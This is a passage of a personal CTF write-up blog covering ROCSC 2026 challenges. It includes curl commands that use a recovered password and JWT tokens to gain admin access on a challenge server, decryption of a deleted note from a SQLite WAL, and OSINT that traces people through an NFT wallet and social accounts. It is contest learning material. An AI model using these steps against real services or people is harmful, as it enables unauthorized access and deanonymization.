+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> flag_found<span style="color:#f92672">.</span>wait()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tasks:
+</span></span><span style="display:flex;"><span>            t<span style="color:#f92672">.</span>cancel()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> asyncio<span style="color:#f92672">.</span>gather(<span style="color:#f92672">*</span>tasks, return_exceptions<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> browser<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>asyncio<span style="color:#f92672">.</span>run(main())
+</span></span></code></pre></div><h2 id="jail">jail<a hidden class="anchor" aria-hidden="true" href="#jail">#</a></h2>
+<p>Shamelessly I will admit Claude Premium clutched this, with absolutely zero human intervention. I didn&rsquo;t even bother figuring out why this was vulnerable here.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/flug.png#center"></p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/claud.png#center"></p>
+<h1 id="network">Network<a hidden class="anchor" aria-hidden="true" href="#network">#</a></h1>
+<h2 id="chimera-void">Chimera Void<a hidden class="anchor" aria-hidden="true" href="#chimera-void">#</a></h2>
+<p>We get a pcap that we don&rsquo;t even need to open for this challenge, genuinely. If we take all the strings, first we get a bunch of &lsquo;A&rsquo;s for obfuscation I suppose, then data that looks like this: <code>G1 F1200 X40.000 Y80.800 E310291.75000</code>. A bit of research, and we find it is G-codes. <a href="https://medium.com/@forwardsecrecy/hackmethod-august-2017-challenges-write-up-51a6ecbd3520">This writeup on a similar challenge</a> was very useful.</p>
+<p>G-codes are data for 3d printers, so we just need an online-no-kali-install-please-gcode-emulator. I tried a bunch of websites which rendered like shit until I found <a href="https://app.meshinspector.com/">this winner</a>.</p>
+<p>The command I used was <code>strings chimera_void.pcap | grep -v '^A' &gt; gcode.txt</code>, and just popped the file into the mesh inspector. And here is the flag!</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/chim.png#center"></p>
+<p>And written out, <code>CTF{CONGRATS_WINNERS}</code>.</p>
+<h1 id="mobile">Mobile<a hidden class="anchor" aria-hidden="true" href="#mobile">#</a></h1>
+<p>I&rsquo;m not really experienced with mobile rev, so these were purely vibe-coded <em>(vibe-hacked?)</em>.</p>
+<h2 id="avault">avault<a hidden class="anchor" aria-hidden="true" href="#avault">#</a></h2>
+<p>I just gave Claude the apk and it made great progress. It figured out we needed a bunch of headers, and that the password needed to be &ldquo;R4M_$tonks&rdquo;. These are the working commands it had me run, in order:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k -H <span style="color:#e6db74">&#39;A-VALUT: x-monitor-client-921754&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>https://34.185.140.241:31454/anon
+</span></span><span style="display:flex;"><span>   ANON<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiY2xpZW50IjoiYW5kcm9pZF9jbGllbnQiLCJpYXQiOjE3NzE4NjUyNTIsImV4cCI6MTc3MTg2ODg1Mn0.LugXX6JwCpxTR-9fWkQzuVNZuu-Cy-IXtMeZlVIdk5Q&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl -k -X POST https://34.185.140.241:31454/login <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> H <span style="color:#e6db74">&#39;A-VALUT: x-monitor-client-921754&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$ANON<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> d <span style="color:#e6db74">&#39;{&#34;password&#34;: &#34;R4M_$tonks&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span> JWT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiY2xpZW50IjoiYW5kcm9pZF9jbGllbnQiLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NzE4NjU0MTYsImV4cCI6MTc3MTg2OTAxNn0.HbdBDPbDzrMitfdK1PBRTF-FpiRml9btInZRhNw9N_0&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>curl -k https://34.185.140.241:31454/feed <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> -H <span style="color:#e6db74">&#39;A-VALUT: x-monitor-client-921754&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> -H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$JWT<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>curl -k -X POST https://34.185.140.241:31454/security/options <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> -H <span style="color:#e6db74">&#39;A-VALUT: x-monitor-client-921754&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> -H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$JWT<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> -d <span style="color:#e6db74">&#39;{&#34;door&#34;: &#34;open&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>curl -k -o feed_output https://34.185.140.241:31454/feed <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#39;A-VALUT: x-monitor-client-921754&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$JWT<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>And we get a png file:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/avault.png#center"></p>
+<p>Since the image was also generated by AI I didn&rsquo;t feel that bad for my very little human intervention.</p>
+<h2 id="in-search-of-the-lost-note">In search of the lost note<a hidden class="anchor" aria-hidden="true" href="#in-search-of-the-lost-note">#</a></h2>
+<p>So not just mobile, but also cryptography, how nice. This one was done COMPLETELY by ChatGPT Premium in half an hour.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/mobi2.png#center"></p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/mobi3.png#center"></p>
+<p>But I&rsquo;ll still <em>try</em> to explain what exactly happens here. We already knew this, from the jadx-gui decompiled code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>password <span style="color:#f92672">=</span> pin <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> pepper
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> PBKDF2<span style="color:#f92672">-</span>HMAC<span style="color:#f92672">-</span>SHA256(
+</span></span><span style="display:flex;"><span>    password,
+</span></span><span style="display:flex;"><span>    salt,
+</span></span><span style="display:flex;"><span>    iterations <span style="color:#f92672">=</span> <span style="color:#ae81ff">150000</span>,
+</span></span><span style="display:flex;"><span>    dkLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span> bytes
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>The first thing served to us is the salt in <code>security.xml</code>. So we just needed to find out pepper and pin. And the nonce is derived from the Ts (timestamp).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">nonceFromTs</span>(<span style="color:#66d9ef">long</span> ts) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>16<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> v <span style="color:#f92672">=</span> ts;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> 8; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        b<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">byte</span>) (255 <span style="color:#f92672">&amp;</span> v);
+</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">&gt;&gt;&gt;=</span> 8;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> h <span style="color:#f92672">=</span> sha256(ArraysKt.<span style="color:#a6e22e">plus</span>(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>{110, 111}, b));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ArraysKt.<span style="color:#a6e22e">copyOfRange</span>(h, 0, 12);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>More exactly:</p>
+<ul>
+<li>
+<p>The nonce will look like this: <code>nonce = SHA256( b&quot;no&quot; || (LE64(ts) || 8*0x00) )[0:12]</code>;</p>
+</li>
+<li>
+<p>A payload is generated like this: <code>payload = AES-GCM(key, nonce, plaintext)</code>;</p>
+</li>
+<li>
+<p>The decryption looks like this: <code>plaintext = AES-GCM-decrypt(key, nonceFromTs(created_at), payload)</code>.</p>
+</li>
+</ul>
+<p>Then, the note we were looking for, even though it was deleted from the main DB, can still be retrieved through <code>notes.db-wal</code>. WAL stands for Write-Ahead Log, which is a <em>journal mode in SQLite</em>. So it&rsquo;s just a log file.</p>
+<p>Because our app forces <code>PRAGMA wal_autocheckpoint=0;</code>, the WAL doesn&rsquo;t get refreshed and data just keeps piling on. This is important because it stores both <em>created_at</em> and <em>ciphertext</em> (AKA FLAG!).</p>
+<p>And since only one note was deleted from the db it was pretty obvious which one we needed to use (and yeah, the challenge name too).</p>
+<p>So the password - <code>PBKDF2(pin + &quot;:&quot; + pepper, salt)</code>. The 8 digit pin is just a date, since there&rsquo;s dates on notes, which was just bruteforced from 1990 to 2025, as that&rsquo;s where most the notes were from.</p>
+<p>Now, about pepper, which can be reverse engineered from libcnative.so. It found it like so: <code>objdump -d -M intel app_unzipped/lib/x86_64/libnative.so | grep -n &quot;Native_pepper&quot;</code>.</p>
+<p>And the decompiled code was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>LEN; i<span style="color:#f92672">++</span>) out[i] <span style="color:#f92672">=</span> enc[i] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x5A</span>;
+</span></span><span style="display:flex;"><span>out[LEN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#f92672">*</span>env)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">NewStringUTF</span>(env, out);
+</span></span></code></pre></div><p>So just a simple xor! Lucky ChatGPT. The encoded pepper was in .rodata, and it just xor-ed it to decode it. And now, everything is complete, and we can decode the flag ciphertext!</p>
+<h1 id="osint">OSINT<a hidden class="anchor" aria-hidden="true" href="#osint">#</a></h1>
+<h2 id="museum">museum<a hidden class="anchor" aria-hidden="true" href="#museum">#</a></h2>
+<p>We&rsquo;re supposed to find the museum in which an art piece is located.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/museum.jpg#center"></p>
+<p>With a simple reverse search on the image we find a similar one with the same piece in some blog, including the building with the museum&rsquo;s name.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/museum.png#center"></p>
+<p>The flag: <code>ROCSC{sichuan_science_and_technology_museum}</code></p>
+<h2 id="wonderful-strangers">wonderful-strangers<a hidden class="anchor" aria-hidden="true" href="#wonderful-strangers">#</a></h2>
+<p>We find <code>memepie67</code> on roblox, following just one guy hinting to his youtube channel in his description, with a video of him reading out the flag character by character. <a href="https://www.youtube.com/watch?v=fpND-2ZLKbg">The video</a>.</p>
+<p>Flag: <code>ROCSC{h0w_d0e5_h3_m0v3_l1k3_th1s}</code></p>
+<h2 id="art-gallery-heist-2">art-gallery-heist-2<a hidden class="anchor" aria-hidden="true" href="#art-gallery-heist-2">#</a></h2>
+<p>We&rsquo;re given a picture of an NFT, and through reverse search we find it belongs to the Ocean Racer League collection. By searching it on polygon, I found its owner&rsquo;s wallet address, <code>0xe31f336e1a6983c1a77e1ff7edeaaac1e5d088d3</code>.</p>
+<p>Searching it in github, we find a repo with someone asking for donations at that address, unchainedmf. His bio hints at his Twitter account, which had posted the flag in base64.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/github.png#center"></p>
+<p>This challenge took me way more than it looks, and in the process I thought I had to purchase one of the NFTs in the collection to join their discord server with a wallet verification bot. So here is my beautiful 0.3$ NFT in my portfolio:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/nft.png#center"></p>
+<p>And the flag was <code>ROCSC{n0_ch@in_c@n_ev3r_h0ld_me_d0wn}</code>.</p>
+<h1 id="steganography">Steganography<a hidden class="anchor" aria-hidden="true" href="#steganography">#</a></h1>
+<h2 id="echoes_of_the_past">echoes_of_the_past<a hidden class="anchor" aria-hidden="true" href="#echoes_of_the_past">#</a></h2>
+<p>This one as another one of ChatGPT&rsquo;s artworks. And having done <code>strings</code>, we see that <code>Past Date=06.07.2022</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/steg.png#center"></p>
+<p>Going into Internet Archive at that specific data in that specific website, we see a user trying to log in.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/steg2.png#center"></p>
+<p>sha256-ing the username, we get the flag: <code>ROCSC{2a97516c354b68848cdbd8f54a226a0a55b21ed138e207ad6c5cbb9c00aa5aea}</code>.</p>
+<hr>
+<p>Thank you for reading! The longer python scripts I made can be found <a href="https://github.com/irinasusca/ctf-writeups/tree/main/rocsc2026">here</a>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/ctf/">Ctf</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
